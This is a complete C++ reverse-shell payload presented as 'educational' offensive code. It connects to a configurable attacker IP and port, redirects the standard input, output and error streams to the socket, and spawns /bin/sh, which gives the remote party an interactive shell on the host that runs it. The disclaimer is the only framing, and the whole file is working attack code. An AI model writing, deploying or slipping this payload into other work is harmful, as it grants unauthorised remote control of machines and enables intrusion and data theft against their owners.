/*
 * Payload created by veilwr4ith
 * Warning: This script is intended for educational purposes only.
 * Unauthorized use, deployment, or distribution of this payload
 * is illegal and unethical. Use responsibly and only in environments
 * where you have explicit permission.
 */

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <arpa/inet.h>

#define SERVER_IP "127.0.0.1" // Replace with the attacker's IP address
#define SERVER_PORT 1234 // Replace with the attacker's port number

int main() {
    int sockfd;
    struct sockaddr_in server_addr;

    // Create a socket using TCP protocol
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        std::cerr << "Error creating socket" << std::endl; // Print error if socket creation fails
        return 1;
    }

    // Set up the server address structure
    server_addr.sin_family = AF_INET; // Use IPv4
    server_addr.sin_port = htons(SERVER_PORT); // Port number in network byte order
    inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr); // Convert IP address to binary form

    // Connect to the attacker's server
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        std::cerr << "Error connecting to server" << std::endl; // Print error if connection fails
        close(sockfd);
        return 1;
    }

    // Redirect standard input, output, and error streams to the socket
    dup2(sockfd, 0); // Redirect stdin to the socket
    dup2(sockfd, 1); // Redirect stdout to the socket
    dup2(sockfd, 2); // Redirect stderr to the socket

    // Execute a new shell and connect it to the socket
    execl("/bin/sh", "sh", NULL);

    // Close the socket (this line will only be reached if execl fails)
    close(sockfd);
    return 0;
}

